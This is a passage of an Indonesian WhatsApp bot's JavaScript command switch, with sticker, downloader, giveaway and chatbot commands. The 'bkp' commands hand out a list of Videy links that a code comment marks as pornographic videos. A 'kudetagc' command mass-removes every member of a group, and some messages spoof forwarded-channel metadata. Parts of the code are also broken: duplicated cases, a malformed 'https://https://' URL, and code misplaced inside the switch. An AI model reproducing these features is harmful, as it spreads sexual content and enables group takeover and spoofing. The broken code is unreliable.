      const wordsInLine = line.split(' ');
      const lineWidth =
        wordsInLine.reduce((acc, word) => acc + ctx.measureText(word).width, 0) +
        (wordsInLine.length - 1) * wordSpacing;
      let x = (width - lineWidth) / 2;

      for (let word of wordsInLine) {
        ctx.fillText(word, x + ctx.measureText(word).width / 2, y);
        x += ctx.measureText(word).width + wordSpacing;
      }
      y += fontSize * 1.3;
    }

    const buffer = canvas.toBuffer('image/png');
    const image = await Jimp.read(buffer);
    image.blur(2);
    const finalBuffer = await image.getBufferAsync(Jimp.MIME_PNG);

    return TradzSigma.sendImageAsSticker(m.chat, finalBuffer, m, {
      packname: "Jinshi",
      author: "Nav!!"
    });
  }

  if (!text) return m.reply(`Masukkan teks untuk stiker.\n\nContoh:\n.brat Atmin Ganteng`);
  return BratGenerator(text);
}
break;
case 'brat':
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
if (!text) return replyviex(`Example: .brat Hala Madrid`);
try {
let caption = `Ada 2 tipe brat silahkan pilih tipe yang diinginkan:\n\n1. *Gambar 🖼️*\n2. *Video 🎥*`;
TradzSigma.sendMessage(m.chat, {
text: caption,
footer: `${global.ownername}`,
buttons: [
{
buttonId: `.bratv10 ${text}`,
buttonText: { displayText: "Gambar 🖼️" }
},
{
buttonId: `.bratvideo ${text}`,
buttonText: { displayText: "Video 🎥" }
}
],
viewOnce: true,
}, { quoted: m });
} catch (err) {
console.error(err);
reply(`*Terjadi kesalahan!* 😭\n${err.message || err}`);
}
break
/*
///////listtbokepp////////
case 'bratft': {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
  
  if (!quo) return replyyoimiya("masukan teksnya woii");
  
async function brat(text) {
  try {
    return await new Promise((resolve, reject) => {
      if(!text) return reject("missing text input");
      axios.get("https://brat.caliphdev.com/api/brat", {
        params: {
          text
        },
        responseType: "arraybuffer"
      }).then(res => {
        const image = Buffer.from(res.data);
        if(image.length <= 10240) return reject("failed generate brat");
        return resolve({
          success: true, 
          image
        })
      })
    })
  } catch (e) {
    return {
      success: false,
      errors: e
    }
  }
}

const buf = await brat(quo);
await TradzSigma.sendImage(m.chat, buf.image, m, { packname: "Liyaa MD", author: "Hann Universe!!" })
}
break
*/
case "listbkp":{
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
replyviex('ada 20 bkp ketik contoh : bkp1')
}
break
case "bkp1":{
replyviex('https://videy.co/v?id=yUI9qHxy1')
}
break
case "bkp2":{
replyviex('https://videy.co/v?id=taEdfX521')
}
break
case "bkp3":{
replyviex('https://videy.co/v?id=IZ2dEEPR1')
}
break
case "bkp4":{
replyviex('https://videy.co/v?id=cFmHXLnR1')
}
break
case "bkp5":{
replyviex('https://videy.co/v?id=VkhX0rIY1')
}
break
case "bkp6":{
replyviex('https://videy.co/v?id=HbciV3Ng1')
}
break
case "bkp7":{
`${global.thumbnail}`,('https://videy.co/v?id=iDZaNE341')
}
break
case "bkp8":{
replyviex('https://videy.co/v?id=99FZhvO21')
}
break
case "bkp9":{
replyviex('https://videy.co/v?id=5JeZNWaH1')
}
break
case "bkp10":{
replyviex('https://videy.co/v?id=KTw1lWWa1')
}
break
case "bkp11":{
replyviex('https://videy.co/v?id=UdqYuonc1')
}
break
case "bkp12":{
replyviex('https://videy.co/v?id=vApGwZAC1')
}
break
case "bkp13":{
replyviex('https://videy.co/v?id=ji0jr2f71')
}
break
case "bkp14":{
replyviex('https://videy.co/v?id=kxx94sEr1')
}
break
case "bkp15":{
replyviex('https://videy.co/v?id=jRlBDROc1')
}
break
case "bkp16":{
replyviex('https://videy.co/v?id=LevNyK2x1')
}
break
case "bkp17":{
replyviex('https://videy.co/v?id=a1Uim8Ey')
}
break
case "bkp18":{
replyviex('https://videyvideo.short.gy/Cwdcj1')
}
break
case "bkp19":{
replyviex('https://videy.co/v?id=bliIEHfL1')
}
break
case "bkp20":{
replyviex('https://videy.co/v?id=Yep64SD61')
}
break
///==============///////////////////
//================================================================================
case 'videy': {
                if (!text) return m.reply("Masukkan Link Videy")
                if (!text.includes('videy')) return m.reply("Itu Bukan Link Videy")
                try {
                    let anu = await fetchJson(`https://api.agatz.xyz/api/videydl?url=${text}`);
                    let anu1 = anu.data;
                    TradzSigma.sendMessage(m.chat, {
                        video: {
                            url: anu1
                        },
                        caption: "Downloader Videy"
                    }, {
                        quoted: qloc
                    });
                } catch (err) {
                    m.reply("Terjadi Kesalahan Saat Mengambil Data")
                }
            }
            break
///////////========================/////////
case "kudetagc": case "kudeta": {
if (!TradID) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return replyviex("Grup Ini Sudah Tidak Ada Member!")
await replyviex("Kudeta Grup Byeeee 🔥")
for (let i of memberFilter) {
await TradzSigma.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await replyviex("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break
case 'upch':
            case 'upsaluran': {
                if (!text) return m.reply("reply audio\ncontoh: .upch (wm nya)")
                TradzSigma.sendMessage(m.chat, {
                    react: {
                        text: '⏳',
                        key: m.key,
                    }
                })
                await sleep(6000)
                TradzSigma.sendMessage(m.chat, {
                    react: {
                        text: '⌛',
                        key: m.key,
                    }
                })
                TradzSigma.sendMessage(`${global.my.idch}`, {
                    audio: await quoted.download(),
                    mimetype: "audio/mpeg",
                    ptt: true,
                    contextInfo: {
                        isForwarded: true,
                        mentionedJid: [m.sender],
                        businessMessageForwardInfo: {
                            businessOwnerJid: "120363401647250932@newsletter"
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterName: `${text}`,
                            newsletterJid: "120363401647250932@newsletter"
                        }
                    }
                }, {
                    quoted: m
                })
                await sleep(6000)
                TradzSigma.sendMessage(m.chat, {
                    react: {
                        text: '✅',
                        key: m.key,
                    }
                })
                m.reply(`mengirim audio ke channel berhasil`)
            }
            //global.db.data.users[m.sender].limit -= 20;
            //await m.reply(`-20⚡ limit terpakai✓ sisa limit ${global.db.data.users[m.sender].limit}`)
            break
////////////////////////
case 'upch1':
case 'upsaluran1': {
    if (!text) return m.reply("Reply audio dan ketik: .upch1 (judul lagu / nama saluran)");

    if (!m.quoted || !/audio/.test(m.quoted.mimetype)) {
        return m.reply("Reply audio-nya dulu!");
    }

    await TradzSigma.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    await sleep(2000);

    const audioData = await m.quoted.download();
    const yt = await getYouTubeData(text); // ← fungsi ambil judul-thumbnail YouTube

    if (!yt) return m.reply("Gagal mengambil data dari YouTube.");

    await TradzSigma.sendMessage(global.my.idch, {
        audio: audioData,
        mimetype: "audio/mpeg",
        ptt: true,
        contextInfo: {
            isForwarded: true,
            businessMessageForwardInfo: { businessOwnerJid: global.my.idch },
            forwardedNewsletterMessageInfo: {
                newsletterName: text,
                newsletterJid: global.my.idch
            },
            externalAdReply: {
                showAdAttribution: true,
                title: yt.title,
                body: `Durasi: ${yt.duration}`,
                thumbnailUrl: yt.thumbnail,
                mediaType: 2,
                mediaUrl: yt.url,
                sourceUrl: yt.url
            }
        }
    });

    await sleep(2000);
    await TradzSigma.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    m.reply(`✅ Berhasil kirim ke channel.`);
    break;
}

case 'bratgenvid': {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
 
 if (!quo) return replyviex("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get("https://https://fgsi-brat.hf.space/?text=Brat%20API%20BY%20FGSIDEV&isVideo=true", {
 params: {
 text
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 }
}

const buf = await brat(quo);
await TradzSigma.sendImageAsSticker(m.chat, buf.image, m, { packname: "DinzID Chx", author: "Qiaa" })
}
break

case prefix + 'search-sticker': {
 if (!text) return replyviex(`Contoh: .${command} anime`);
 try {
 let tick = await (await fetch('https://endpoint.web.id/search/sticker?key=' + global.key + '&query=' + text)).json();
 if (tick.status) {
 let result = tick.result;
 let responseMessage = `*Title:* ${result.title}\n*Author:* ${result.author}\n*Author Link:* ${result.author_link}\n\n*Stickers:*\n`;
 result.sticker.forEach((stickerUrl, index) => {
 responseMessage += `Sticker ${index + 1}: ${stickerUrl}\n`;
 });
 m.reply(responseMessage);
 } else {
 replyviex('Tidak ada hasil ditemukan.');
 }
 } catch (e) {
 replyviex('Terjadi kesalahan!');
 }
}
break

case prefix + 'upscale2': case prefix + 'hd2': case prefix + 'hdr2': case prefix + 'remini2': {
 if (!/image/.test(mime)) {
 return replyviex(`*PERMINTAAN ERROR!! PESAN :*\n> *Reply/Send Gambar Dengan Caption .${command}*`);
 }
 if (!quoted) {
 return replyviex(`*PERMINTAAN ERROR!! PESAN :*\\n> *Reply/Send Gamba Dengan Caption .${command}*`);
 }
 let media = await TradzSigma.downloadAndSaveMediaMessage(quoted);
 let anu = await shannzCdn(media);
 let link = anu.result.url;
 let scale = await (await fetch('https://endpoint.web.id/tools/upscaler?key=' + global.key + '&url=' + link)).json();
 let final = scale.result.data.downloadUrls[0]
 TradzSigma.sendMessage(m.chat, { image: { url: final }, caption: '*SUCCESS ✅*'}, { quoted: m})
}
break

break
case 'spotify1': case 'playspotify': case 'spotifys1': {
if (!text) return reply('Masukan judul lagu!')
let result = await searchSpotify(text)
 let caption = result.map((v, i) => {
 return {
 header: "",
 title: v.name,
 description: `Link: ${v.link}`,
 id: '.spdl ' + v.link
 }
 })
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: {
 body: {
 text: `🔎 Hasil Pencarian Dari ${text}\nSilahkan Pilih List dibawah ini`,
 },
 footer: {
 text: 'Yoimiya Chx'
 },
 header: {
 title: "Spotify - Search",
 subtitle: "",
 hasMediaAttachment: false,
 },
 nativeFlowMessage: {
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "CLICK HERE",
 sections: [
 {
 title: "",
 rows: caption
 }
 ]
 })
 }
 ]
 }
 }
 }
 }
 }, { quoted: m }, {});
 await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });
}
break
case 'spdl1': case 'spotifydl1': {
if (!text) return reply('Masukan Link')
let result = await spotifydl(text)
let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\nDinzID Chx`
 const p = await new canvafy.Spotify()
 .setTitle(result.title)
 .setAuthor("Spotify - Downloader")
 .setTimestamp(40, 100)
 .setOverlayOpacity(0.8)
 .setBorder("#fff", 0.8)
 .setImage(result.image)
 .setBlur(3)
 .build(); 

 await TradzSigma.sendMessage(from, { image: p, caption: captionvid }, { quoted: m })
 TradzSigma.sendMessage(m.chat, { audio: { url: result.download}, mimetype: 'audio/mpeg', filename: 'MP3 BY ' + 'DinzID Chx' }, { quoted: m });
}
break

break
case 'spotify1': case 'playspotify': case 'spo1': {
if (!text) return reply('Masukan judul lagu!')
let result = await searchSpotify(text)
 let caption = result.map((v, i) => {
 return {
 header: "",
 title: v.name,
 description: `Link: ${v.link}`,
 id: '.spdl ' + v.link
 }
 })
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: {
 body: {
 text: `🔎 Hasil Pencarian Dari ${text}\nSilahkan Pilih List dibawah ini`,
 },
 footer: {
 text: 'Yoimiya Chx'
 },
 header: {
 title: "Spotify - Search",
 subtitle: "",
 hasMediaAttachment: false,
 },
 nativeFlowMessage: {
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "CLICK HERE",
 sections: [
 {
 title: "",
 rows: caption
 }
 ]
 })
 }
 ]
 }
 }
 }
 }
 }, { quoted: m }, {});
 await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });
}
break
case 'spdl1': case 'spotifydl1': {
if (!text) return reply('Masukan Link')
let result = await spotifydl(text)
let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\nDinzID Chx`
 const p = await new canvafy.Spotify()
 .setTitle(result.title)
 .setAuthor("Spotify - Downloader")
 .setTimestamp(40, 100)
 .setOverlayOpacity(0.8)
 .setBorder("#fff", 0.8)
 .setImage(result.image)
 .setBlur(3)
 .build(); 

 await TradzSigma.sendMessage(from, { image: p, caption: captionvid }, { quoted: m })
 TradzSigma.sendMessage(m.chat, { audio: { url: result.download}, mimetype: 'audio/mpeg', filename: 'MP3 BY ' + 'DinzID Chx' }, { quoted: m });
}
break

case 'presetam': {
const axios = require('axios');
const cheerio = require('cheerio');
`Ex : ${prefix + command} https://alightcreative.com/am/share/u/FttFe29F5Dd3AUOxUIiztaBmABw2/p/sd8WMnsElo-b71f57e092dbe21f?source=link`

if (!text) return m.reply(input)
if (!(text.includes('http://') || text.includes('https://'))) return replyviex(`url invalid, please input a valid url. Try with add http:// or https://`)
 if (!(text.includes('alight.link') || text.includes('alightcreative.com'))) return replyviex(`Invalid Alight Motion URL.`)
 
async function alightScrape(url) {
 try {
 const response = await axios.get(url, {
 headers: {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
 'Referer': 'https://alight.link',
 },
 });

const $ = cheerio.load(response.data);
const title = $('meta[property="og:title"]').attr('content').text();
const description = $('meta[property="og:description"]').attr('content').text();
return {
 title,
 description
}

/**
{
 title: 'Nama Proyek 22',
 description: 'This Alight Motion package contains 1 project, total 19.3 MB.'
}
*/

 } catch (error) {
 return error
 }
}
const njut = alightScrape(text);
replyviex(`[ *PRESET ALIGHT MOTION* ]

Judul: ${njut.title}
Deskripsi: ${njut.description}
`)
}
break
 //=========
			
	/*		case 'ytplayxx': 
case 'ytmp3xx': {
 if (!text) return replyyoimiya(`Silakan masuk kan link youtube nya, Contoh: ${prefix + command} https://youtube.com/watch?v=Xs0Lxif1u9E`);

 const url = text.trim();
 const format = 'mp3';

 const regex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.?be)\/.+$/;

 if (!regex.test(url)) {
 return replyyoimiya('link yang anda berikan tidak valid, silahkan masuk kan link yang benar.');
 }
 replyyoimiya('✨ Tunggu sebentar');
 try {
 const response = await axios.post('http://kinchan.sytes.net/ytdl/downloader', {
 url: url,
 format: format
 });

 const { title, downloadUrl } = response.data;

 const audioResponse = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
 const audioBuffer = Buffer.from(audioResponse.data);

 await TradzSigma.sendMessage(m.chat, {
 audio: audioBuffer,
 mimetype: 'audio/mpeg',
 ptt: false
 }, { quoted: m });

 } catch (error) {
 console.error('Error:', error);
 replyyoimiya('Terjadi kesalahan saat mengunduh video, silahkan coba lagi.');
 }
}
break

// batas ytmp4
*/
case 'ytmp4': {
    if (!text || !text.includes('http')) {
        m.reply('Silakan gunakan perintah .ytmp diikuti dengan URL video YouTube. Contoh: .ytmp https://youtube.com/...');
        break;
    }

    m.reply(mess.wait);
    let anu = `https://api.siputzx.my.id/api/d/ytmp4?url=${encodeURIComponent(text)}`;
    
    try {
        const res = await fetch(anu);
        const response = await res.json();
        
        if (!response || !response.data || !response.data.dl) {
            m.reply('Gagal mengambil video. Pastikan URL yang diberikan valid.');
            break;
        }

        TradzSigma.sendMessage(m.chat, {
            video: { url: response.data.dl },
            mimetype: 'video/mp4',
            caption: mess.done
        }, { quoted: m });
        
    } catch (e) {
        console.log(e);
        m.reply("Terjadi kesalahan saat memproses permintaan.");
    }
    break;
}


// batas play

exports.fetchdata = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: "GET",
			url,
			headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (err) {
		return err
	}
}
break
case 'giveaway': {
if (!m.isGroup) return replyviex('Fitur Khusus Group!')
    if (!args[0]) {
        return m.reply(`
╭─❏ *MENU GIVEAWAY*
│ • .giveaway mulai <jumlah_pemenang> <hadiah>
│ • .giveaway ikut
│ • .giveaway batal
│ • .giveaway redeem
│ • .giveaway list
╰───────────────❏
`);
    }

    // MULAI GIVEAWAY
    if (args[0] === 'mulai') {
        if (global.giveaway.status) return m.reply('⚠️ Giveaway masih berlangsung!');
        if (!args[1] || isNaN(args[1])) return m.reply('Masukkan jumlah pemenang!\nContoh: .giveaway mulai 2 Pulsa 10k');
        if (!args[2]) return m.reply('Masukkan hadiah giveaway!');

        global.giveaway.status = true;
        global.giveaway.jumlah = parseInt(args[1]);
        global.giveaway.hadiah = args.slice(2).join(' ');
        global.giveaway.peserta = [];

        let pembuat = m.pushName || 'Pengguna';
        global.giveaway.peserta.push(pembuat); // Otomatis ikut

        m.reply(`🎁 Giveaway dimulai!\n🎉 Hadiah: *${global.giveaway.hadiah}*\n🏆 Jumlah Pemenang: ${global.giveaway.jumlah}\n📥 ${pembuat} otomatis ikut sebagai peserta pertama.\nGunakan *.giveaway ikut* untuk bergabung!`);
    }

    // IKUT GIVEAWAY
    else if (args[0] === 'ikut') {
        if (!global.giveaway.status) return m.reply('⚠️ Belum ada giveaway yang berlangsung!');
        if (!Array.isArray(global.giveaway.peserta)) global.giveaway.peserta = [];

        let name = m.pushName || 'Pengguna';
        if (global.giveaway.peserta.includes(name)) return m.reply('✅ Kamu sudah ikut giveaway.');

        global.giveaway.peserta.push(name);
        m.reply(`🎉 ${name} berhasil ikut giveaway!`);
    }

    // LIST PESERTA
    else if (args[0] === 'list') {
        if (!global.giveaway.status) return m.reply('⚠️ Tidak ada giveaway yang sedang berlangsung.');
        if (global.giveaway.peserta.length === 0) return m.reply('❌ Belum ada peserta.');

        let list = global.giveaway.peserta.map((v, i) => `• ${i + 1}. ${v}`).join('\n');
        m.reply(`📋 Daftar Peserta Giveaway:\n${list}`);
    }

    // REDEEM GIVEAWAY (PENGUNDIAN MANUAL)
    else if (args[0] === 'redeem') {
        if (!global.giveaway.status) return m.reply('⚠️ Tidak ada giveaway yang sedang berlangsung.');
        if (global.giveaway.peserta.length === 0) return m.reply('❌ Tidak ada peserta yang ikut.');

        let winners = [];
        let pesertaCopy = [...global.giveaway.peserta];

        while (winners.length < global.giveaway.jumlah && pesertaCopy.length > 0) {
            let index = Math.floor(Math.random() * pesertaCopy.length);
            let selected = pesertaCopy.splice(index, 1)[0];
            if (!winners.includes(selected)) {
                winners.push(selected);
            }
        }

        // Umumkan satu per satu dengan delay
        let announce = async () => {
            for (let i = 0; i < winners.length; i++) {
                await new Promise(r => setTimeout(r, 3000)); // delay 3 detik
                await m.reply(`⏳ Sedang mencari pemenang ke-${i + 1}...`);
                await new Promise(r => setTimeout(r, 5000)); // delay lagi
                await m.reply(`🎉 Selamat kepada *${winners[i]}*! Lu dapat *${global.giveaway.hadiah}*`);
            }

            // Reset giveaway
            global.giveaway = { status: false, hadiah: "", peserta: [], jumlah: 1 };
        };
        announce();
    }

    // BATAL GIVEAWAY
    else if (args[0] === 'batal') {
        if (!global.giveaway.status) return m.reply('⚠️ Tidak ada giveaway yang sedang berlangsung.');
        global.giveaway = { status: false, hadiah: "", peserta: [], jumlah: 1 };
        m.reply('❌ Giveaway dibatalkan.');
    }

    // PERINTAH TIDAK DIKENALI
    else {
        m.reply('❌ Perintah tidak dikenali.\nGunakan: .giveaway mulai <jumlah> <hadiah>, .giveaway ikut, .giveaway batal, .giveaway redeem, atau .giveaway list');
    }
}
break;
case 'yt': {
    if (!text) return replyviex(`Silakan masukkan judul lagu yang ingin dicari, Contoh: ${prefix + command} senorita`);
    const { fetchdata } = require("./all/function.js")
    const yts = require('yt-search');
    const query = text.trim();
    replyviex('✨Tunggu Sebentar, Sedang Mencari Lagu...');

    try {
        const searchResult = await yts(query);
        if (searchResult.videos.length === 0) {
            return replyviex('Tidak ada hasil ditemukan untuk pencarian tersebut.');
        }

        const video = searchResult.videos[0];
        const url = video.url;
        const format = 'mp3';

        const response = await axios.post('http://kinchan.sytes.net/ytdl/downloader', {
            url: url,
            format: format
        });

        const { title, downloadUrl } = response.data;

        const audioResponse = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
        const audioBuffer = Buffer.from(audioResponse.data);

        await TradzSigma.sendMessage(m.chat, {
            audio: audioBuffer,
            mimetype: 'audio/mp4',
            fileName: `${title}.mp3`,
            contextInfo: {
                isForwarded: true,
                forwardingScore: 99999,
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    previewType: 2,
                    mediaUrl: url,
                    title: title,
                    body: `views: ${video.views} / durasi: ${video.timestamp}`,
                    sourceUrl: url,
                    thumbnail: await fetchdata(video.thumbnail),
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });

    } catch (error) {
        console.error('Error:', error);
        replyviex('Terjadi kesalahan saat mengunduh video, silahkan coba lagi.');
    }
}
break
case 'playyt': { 
if (!isPrem) return reply(mess.only.premium)
const yts = require('yt-search');
const randomAudioQuality = () => {
    const qualities = [1, 2, 3, 4]; // Indeks kualitas
    const randomIndex = Math.floor(Math.random() * qualities.length);
    return qualities[randomIndex];
};
const checkQuality = (type, qualityIndex) => {
    const qualities = {
        audio: { 1: '32', 2: '64', 3: '128', 4: '192' },
        video: { 1: '144', 2: '240', 3: '360', 4: '480', 5: '720', 6: '1080', 7: '1440', 8: '2160' }
    };
    if (!qualities[type]?.[qualityIndex]) {
        throw new Error(` Kualitas ${type} tidak valid. Pilih salah satu: ${Object.keys(qualities[type]).join(', ')}`);
    }
};
const fetchData = async (url, cdn, body = {}) => {
    const headers = {
        accept: '*/*',
        referer: 'https://ytshorts.savetube.me/',
        origin: 'https://ytshorts.savetube.me/',
        'user-agent': 'Postify/1.0.0',
        'Content-Type': 'application/json',
        authority: `cdn${cdn}.savetube.su`
    };
    try {
        const response = await axios.post(url, body, { headers });
        return response.data;
    } catch (error) {
        console.error(`Error accessing CDN${cdn}: ${error.message}`);
        throw new Error(' Gagal mengambil data dari server.');
    }
};
const randomCdn = () => {
    const availableCdns = [51, 52, 53, 54, 56, 57, 58, 59, 60, 61];
    return availableCdns[Math.floor(Math.random() * availableCdns.length)];
};
const dLink = (cdnUrl, type, quality, videoKey) => {
    return `https://${cdnUrl}/download`;
};
const dl = async (link, qualityIndex, typeIndex) => {
    const type = typeIndex === 1 ? 'audio' : 'video';
    const qualities = { 1: '32', 2: '64', 3: '128', 4: '192' };
    const quality = qualities[qualityIndex];
    if (!type) throw new Error('Tipe tidak valid. Pilih 1 untuk audio atau 2 untuk video');
    checkQuality(type, qualityIndex);
    const cdnNumber = randomCdn();
    const cdnUrl = `cdn${cdnNumber}.savetube.su`;
    const videoInfo = await fetchData(`https://${cdnUrl}/info`, cdnNumber, { url: link });
    const body = {
        downloadType: type,
        quality: quality,
        key: videoInfo.data.key
    };
    const dlRes = await fetchData(dLink(cdnUrl, type, quality, videoInfo.data.key), cdnNumber, body);
    return {
        link: dlRes.data.downloadUrl,
        duration: videoInfo.data.duration,
        durationLabel: videoInfo.data.durationLabel,
        fromCache: videoInfo.data.fromCache,
        id: videoInfo.data.id,
        key: videoInfo.data.key,
        thumbnail: videoInfo.data.thumbnail,
        thumbnail_formats: videoInfo.data.thumbnail_formats,
        title: videoInfo.data.title,
        titleSlug: videoInfo.data.titleSlug,
        videoUrl: videoInfo.data.url,
        quality,
        type
    };
};
if (!text) return replyviex(`Masukkan juga judul lagu, contoh *${command} lucid dreams*`);
try {
  TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
    let rus = await yts(text);
    if (rus.all.length === 0) return replyviex("Video tidak ditemukan atau tidak bisa di-download.");
    let data = rus.all.filter(v => v.type === 'video');
    if (data.length === 0) return replyviex("Tidak ada video yang ditemukan.");
    let res = data[0];
    let thumbUrl = `https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`;
    let inithumb = await getBuffer(thumbUrl);
    let teks = `*ᴘʟᴀʏɪɴɢ ᴍᴜsɪᴄ ɪɴ ʏᴏᴜᴛᴜʙᴇ*\n\n` +
               `📺 *ᴄʜᴀɴɴᴇʟ* : ${res.author.name}\n` +
               `👀 *ᴠɪᴇᴡᴇʀs* : ${res.views} kali\n` +
               `⏱️ *ᴅᴜʀᴀᴛɪᴏɴ* : ${res.timestamp}\n` +
               `🔗 *ᴜʀʟ ᴘʟᴀʏ* : ${res.url}\n\n` +
               `\n*sᴇᴅᴀɴɢ ᴍᴇɴɢɪʀɪᴍ ᴀᴜᴅɪᴏ....!*`;

    await TradzSigma.sendMessage(m.chat, {
        contextInfo: { 
            externalAdReply: { 
                showAdAttribution: true, 
                title: res.title,
                body: new Date().toLocaleString(),													
                mediaType: 2,  
                renderLargerThumbnail: true,
                thumbnail: inithumb,
                mediaUrl: res.url,
                sourceUrl: res.url
            }
        },
        image: { url: thumbUrl },
        text: teks
    }, { quoted: m });
          let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
          let ahh = mbut.result
          let crot = ahh.download.audio
        const nt = await TradzSigma.sendMessage(m.chat,{ audio: {url: crot}, mimetype: 'audio/mpeg', ptt: true },{quoted:m});
        await TradzSigma.sendMessage(m.chat, { react: { text: '🎶', key: nt.key }})
        
} catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan: ${err.message}`);
}
}
break
case 'alarm': {
let clockstring = '05:00' 
let isAlarmActive = false 

function playAlarm() {
  console.log('Alarm berbunyi!')
}

function setAlarmTime(time) {
  clockstring = time
  console.log(`Jam alarm berhasil diatur menjadi ${clockstring}`)
}


function turnOffAlarm() {
  clockstring = null
  console.log('Alarm berhasil dimatikan')
}
   
  let command = args[0] 

  if (command === 'atur') {
    let time = args[1] 
    setAlarmTime(time)
    isAlarmActive = true
    replyviex(`Jam alarm berhasil diatur menjadi ${clockstring}`)
  } else if (command === 'matikan') {
    turnOffAlarm()
    isAlarmActive = false
    replyviex(`Alarm berhasil dimatikan`)
  } else {
    replyviex(`Pilihan yang tersedia: atur, matikan`)
  }

  if (isAlarmActive && new Date().toLocaleTimeString() === clockstring) {
    playAlarm()
  }
}
break
case 'kanjut': {
TradzSigma.sendMessage(m.chat, {
 image: { url: pp },
 caption: wm,
"annotations": [
      {
        "polygonVertices": [
          {
            "x": 0.05625700578093529,
            "y": 0.1530572921037674
          },
          {
            "x": 0.9437337517738342,
            "y": 0.1530572921037674
          },
          {
            "x": 0.9437337517738342,
            "y": 0.8459166884422302
          },
          {
            "x": 0.05625700578093529,
            "y": 0.8459166884422302
          }
        ],
        "newsletter": {
          "newsletterJid": "120363401647250932@newsletter",
          "serverMessageId": 3033,
          "newsletterName": "DinzID & Qiaa",
          "contentType": "UPDATE_CARD",
        }
      }
    ]
}, { quoted : m })
}
break
case 'hutaoai':
case 'hutao':
case 'hutao-cai':
case 'hutaoc.ai': { 
    let trukss = m.sender
    if (trukss === botNumber) return;
    if (!text) return replyhutao('apa yang bisa hutao bantu?')
    let name = TradzSigma.getName(m.sender)
    try { 
        const hm = await fetch("https://cai.neekoi.me/cai?char=UXcPdzizz8tK7x7Gbao4b4zwjewTpJFbT8SYDZJqaK4&message=" + encodeURIComponent(text))
        const hasil = await hm.json()     
        const answer = hasil.reply || "Maaf, saya tidak dapat memahami pesan Anda"
        replyhutao(answer)
    } catch (error) {
        console.error("Error fetching data:", error)
        replyhutao("Maaf, terjadi kesalahan: " + error.message)
    }
}
break
case 'elaina-cai': { 
    let trukss = m.sender
    if (trukss === botNumber) return;
    if (!text) return replyelaina('hai sayang gimana hari harimu?')
    let name = TradzSigma.getName(m.sender)
    try { 
        const hm = await fetch("https://cai.neekoi.me/cai?char=SoLDGY1x-6b5CUaTnqxE8ECcWjqvCTZTOO8Y_ssktI0&message=" + encodeURIComponent(text))
        const hasil = await hm.json()     
        const answer = hasil.reply || "Maaf, saya tidak dapat memahami pesan Anda"
        replyelaina(answer)
    } catch (error) {
        console.error("Error fetching data:", error)
        replyelaina("Maaf, terjadi kesalahan: " + error.message)
    }
}
break
case 'kurumi-cai': { 
